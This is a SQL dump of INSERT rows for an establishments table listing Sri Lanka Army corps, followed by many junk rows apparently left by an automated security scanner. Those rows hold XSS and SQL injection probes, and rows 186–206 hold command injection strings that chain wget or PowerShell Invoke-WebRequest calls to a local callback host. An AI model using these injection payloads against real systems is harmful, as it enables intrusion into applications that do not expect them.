INSERT INTO `establishments_copy1` VALUES (19, 'Special Forces Regiment', 'SF', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (20, 'Military Intelligence Corps', 'MIC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (21, 'Corps of Engineer Services', 'CES', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (22, 'Sri Lanka Army Service Corps', 'SLASC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (23, 'Sri Lanka Army Medical Corps', 'SLAMC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (24, 'Sri Lanka Army Ordnance Corps', 'SLAOC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (25, 'Sri Lanka Electrical and Mechanical Engineers', 'SLEME', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (26, 'Sri Lanka Corps of Military Police', 'SLCMP', NULL, '1', NULL, '2022-12-01 01:23:55', '2023-01-17 11:01:02', NULL);
INSERT INTO `establishments_copy1` VALUES (27, 'Sri Lanka Army GeneralService Corps', 'SLAGSC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (28, 'Sri Lanka Army Womens Corps', 'SLAWC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (29, 'Sri Lanka Rifle Corps', 'SLRC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (30, 'Sri Lanka Army Pineer Corps', 'SLAPC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (31, 'Sri Lanka National Guard', 'SLNG', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (32, 'Corps of Agriculture and Livestock', 'CAL', NULL, '1', NULL, '2022-12-01 01:23:55', '2023-01-17 10:23:01', NULL);
INSERT INTO `establishments_copy1` VALUES (34, 'QQQA', 'QQQ000A', '1', '1', '2', '2022-12-19 01:06:32', '2022-12-19 01:07:07', '2022-12-19 01:07:07');
INSERT INTO `establishments_copy1` VALUES (35, 'SSS', 'SSS1', '1', NULL, '1', '2022-12-19 01:07:33', '2022-12-19 01:09:00', '2022-12-19 01:09:00');
INSERT INTO `establishments_copy1` VALUES (36, '1234', '1234', '1', NULL, '1', '2023-01-17 10:01:27', '2023-01-17 10:01:27', NULL);
INSERT INTO `establishments_copy1` VALUES (37, '1234', '1234', '1', NULL, '1', '2023-01-17 10:01:32', '2023-01-17 10:01:32', NULL);
INSERT INTO `establishments_copy1` VALUES (38, '1234', '1234', '1', NULL, '1', '2023-01-17 10:01:41', '2023-01-17 10:01:41', NULL);
INSERT INTO `establishments_copy1` VALUES (39, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:17', '2023-01-17 10:25:17', NULL);
INSERT INTO `establishments_copy1` VALUES (40, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:17', '2023-01-17 10:25:17', NULL);
INSERT INTO `establishments_copy1` VALUES (41, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:18', '2023-01-17 10:25:18', NULL);
INSERT INTO `establishments_copy1` VALUES (42, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:18', '2023-01-17 10:25:18', NULL);
INSERT INTO `establishments_copy1` VALUES (43, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:18', '2023-01-17 10:25:18', NULL);
INSERT INTO `establishments_copy1` VALUES (44, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:18', '2023-01-17 10:25:18', NULL);
INSERT INTO `establishments_copy1` VALUES (45, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:18', '2023-01-17 10:25:18', NULL);
INSERT INTO `establishments_copy1` VALUES (46, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:18', '2023-01-17 10:25:18', NULL);
INSERT INTO `establishments_copy1` VALUES (47, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:18', '2023-01-17 10:25:18', NULL);
INSERT INTO `establishments_copy1` VALUES (48, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:19', '2023-01-17 10:25:19', NULL);
INSERT INTO `establishments_copy1` VALUES (49, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:19', '2023-01-17 10:25:19', NULL);
INSERT INTO `establishments_copy1` VALUES (50, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:19', '2023-01-17 10:25:19', NULL);
INSERT INTO `establishments_copy1` VALUES (51, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:19', '2023-01-17 10:25:19', NULL);
INSERT INTO `establishments_copy1` VALUES (52, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:19', '2023-01-17 10:25:19', NULL);
INSERT INTO `establishments_copy1` VALUES (53, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:19', '2023-01-17 10:25:19', NULL);
INSERT INTO `establishments_copy1` VALUES (54, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:19', '2023-01-17 10:25:19', NULL);
INSERT INTO `establishments_copy1` VALUES (55, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:20', '2023-01-17 10:25:20', NULL);
INSERT INTO `establishments_copy1` VALUES (56, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:20', '2023-01-17 10:25:20', NULL);
INSERT INTO `establishments_copy1` VALUES (57, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:20', '2023-01-17 10:25:20', NULL);
INSERT INTO `establishments_copy1` VALUES (58, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:20', '2023-01-17 10:25:20', NULL);
INSERT INTO `establishments_copy1` VALUES (59, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:22', '2023-01-17 10:25:22', NULL);
INSERT INTO `establishments_copy1` VALUES (60, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:23', '2023-01-17 10:25:23', NULL);
INSERT INTO `establishments_copy1` VALUES (61, '1234', '1234', '1', NULL, '1', '2023-01-17 10:25:35', '2023-01-17 10:25:35', NULL);
INSERT INTO `establishments_copy1` VALUES (62, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:02', '2023-01-17 10:27:02', NULL);
INSERT INTO `establishments_copy1` VALUES (63, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:02', '2023-01-17 10:27:02', NULL);
INSERT INTO `establishments_copy1` VALUES (64, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:03', '2023-01-17 10:27:03', NULL);
INSERT INTO `establishments_copy1` VALUES (65, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:03', '2023-01-17 10:27:03', NULL);
INSERT INTO `establishments_copy1` VALUES (66, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:03', '2023-01-17 10:27:03', NULL);
INSERT INTO `establishments_copy1` VALUES (67, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:03', '2023-01-17 10:27:03', NULL);
INSERT INTO `establishments_copy1` VALUES (68, 'HCL4ppsc4nbuggyRandomValue', '1234', '1', NULL, '1', '2023-01-17 10:27:03', '2023-01-17 10:27:03', NULL);
INSERT INTO `establishments_copy1` VALUES (69, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:03', '2023-01-17 10:27:03', NULL);
INSERT INTO `establishments_copy1` VALUES (70, '1234', 'HCL4ppsc4nbuggyRandomValue', '1', NULL, '1', '2023-01-17 10:27:03', '2023-01-17 10:27:03', NULL);
INSERT INTO `establishments_copy1` VALUES (71, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (72, '1234WFXSSProbe\'\")/>', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (73, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (74, '1234', '1234WFXSSProbe\'\")/>', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (75, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (76, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (77, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (78, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (79, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (80, '1234\"\'/@=*[]()', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (81, '1234', '1234\"\'/@=*[]()', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (82, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (83, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (84, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (85, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (86, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (87, '1234#&<(,+\">;', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (88, '1234', '1234#&<(,+\">;', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (89, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (90, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (91, '1234', '1234WFXSSProbe', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (92, '1234WFXSSProbe', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (93, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (94, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (95, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (96, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:04', '2023-01-17 10:27:04', NULL);
INSERT INTO `establishments_copy1` VALUES (97, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (98, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (99, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (100, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (101, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (102, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (103, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (104, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (105, '1234', 'A1234B', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (106, 'A1234B', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (107, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (108, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (109, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (110, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (111, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (112, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (113, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (114, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (115, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (116, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (117, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (118, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (119, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (120, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (121, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (122, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (123, '1234', 'ProbePhishing', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (124, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (125, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (126, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (127, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (128, 'ProbePhishing', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (129, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (130, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (131, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (132, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:05', '2023-01-17 10:27:05', NULL);
INSERT INTO `establishments_copy1` VALUES (133, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (134, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (135, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (136, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (137, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (138, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (139, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (140, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (141, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (142, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (143, '1234', 'WF\'SQL\"Probe;A--B', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (144, 'WF\'SQL\"Probe;A--B', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (145, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (146, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (147, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (148, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (149, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (150, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (151, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (152, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (153, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (154, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (155, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (156, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (157, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (158, '1234', '1234\'\"', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (159, '1234\'\"', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (160, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (161, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:06', '2023-01-17 10:27:06', NULL);
INSERT INTO `establishments_copy1` VALUES (162, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:07', '2023-01-17 10:27:07', NULL);
INSERT INTO `establishments_copy1` VALUES (163, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:07', '2023-01-17 10:27:07', NULL);
INSERT INTO `establishments_copy1` VALUES (164, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:07', '2023-01-17 10:27:07', NULL);
INSERT INTO `establishments_copy1` VALUES (165, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:07', '2023-01-17 10:27:07', NULL);
INSERT INTO `establishments_copy1` VALUES (166, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:07', '2023-01-17 10:27:07', NULL);
INSERT INTO `establishments_copy1` VALUES (167, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:07', '2023-01-17 10:27:07', NULL);
INSERT INTO `establishments_copy1` VALUES (168, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:07', '2023-01-17 10:27:07', NULL);
INSERT INTO `establishments_copy1` VALUES (169, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:07', '2023-01-17 10:27:07', NULL);
INSERT INTO `establishments_copy1` VALUES (170, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:07', '2023-01-17 10:27:07', NULL);
INSERT INTO `establishments_copy1` VALUES (171, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:07', '2023-01-17 10:27:07', NULL);
INSERT INTO `establishments_copy1` VALUES (172, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:07', '2023-01-17 10:27:07', NULL);
INSERT INTO `establishments_copy1` VALUES (173, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:07', '2023-01-17 10:27:07', NULL);
INSERT INTO `establishments_copy1` VALUES (174, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:08', '2023-01-17 10:27:08', NULL);
INSERT INTO `establishments_copy1` VALUES (175, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:08', '2023-01-17 10:27:08', NULL);
INSERT INTO `establishments_copy1` VALUES (176, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:08', '2023-01-17 10:27:08', NULL);
INSERT INTO `establishments_copy1` VALUES (177, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:08', '2023-01-17 10:27:08', NULL);
INSERT INTO `establishments_copy1` VALUES (178, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:08', '2023-01-17 10:27:08', NULL);
INSERT INTO `establishments_copy1` VALUES (179, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:08', '2023-01-17 10:27:08', NULL);
INSERT INTO `establishments_copy1` VALUES (180, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:08', '2023-01-17 10:27:08', NULL);
INSERT INTO `establishments_copy1` VALUES (181, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:08', '2023-01-17 10:27:08', NULL);
INSERT INTO `establishments_copy1` VALUES (182, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:08', '2023-01-17 10:27:08', NULL);
INSERT INTO `establishments_copy1` VALUES (183, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:08', '2023-01-17 10:27:08', NULL);
INSERT INTO `establishments_copy1` VALUES (184, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:08', '2023-01-17 10:27:08', NULL);
INSERT INTO `establishments_copy1` VALUES (185, '1234', '1234', '1', NULL, '1', '2023-01-17 10:27:08', '2023-01-17 10:27:08', NULL);
INSERT INTO `establishments_copy1` VALUES (186, '1234', 'wget http://192.168.56.1:54388/AppScanMsg.html?varId=3115', '1', NULL, '1', '2023-01-17 10:27:08', '2023-01-17 10:27:08', NULL);
INSERT INTO `establishments_copy1` VALUES (187, 'wget http://192.168.56.1:54388/AppScanMsg.html?varId=3119', '1234', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (188, '1234', '1234 ; wget http://192.168.56.1:54388/AppScanMsg.html?varId=3120', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (189, '1234', '1234|powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3124', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (190, '1234|powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3125', '1234', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (191, '1234', '1234 | wget http://192.168.56.1:54388/AppScanMsg.html?varId=3128', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (192, '1234 ; wget http://192.168.56.1:54388/AppScanMsg.html?varId=3127', '1234', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (193, '1234', '1234&powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3131', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (194, '1234&powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3132', '1234', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (195, '1234', '1234 & wget http://192.168.56.1:54388/AppScanMsg.html?varId=3133', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (196, '1234 | wget http://192.168.56.1:54388/AppScanMsg.html?varId=3134', '1234', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (197, '1234', '1234&&powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3138', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (198, '1234&&powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3139', '1234', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (199, '1234', '1234 `wget http://192.168.56.1:54388/AppScanMsg.html?varId=3140`', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (200, '1234 & wget http://192.168.56.1:54388/AppScanMsg.html?varId=3141', '1234', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (201, 'powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3144', '1234', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (202, '1234', 'powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3143', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (203, '1234', '1234 && wget http://192.168.56.1:54388/AppScanMsg.html?varId=3147', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (204, '1234 `wget http://192.168.56.1:54388/AppScanMsg.html?varId=3148`', '1234', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (205, '1234;powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3151', '1234', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
INSERT INTO `establishments_copy1` VALUES (206, '1234', '1234;powershell -command Invoke-WebRequest http://192.168.56.1:54388/AppScanMsg.html?varId=3150', '1', NULL, '1', '2023-01-17 10:27:09', '2023-01-17 10:27:09', NULL);
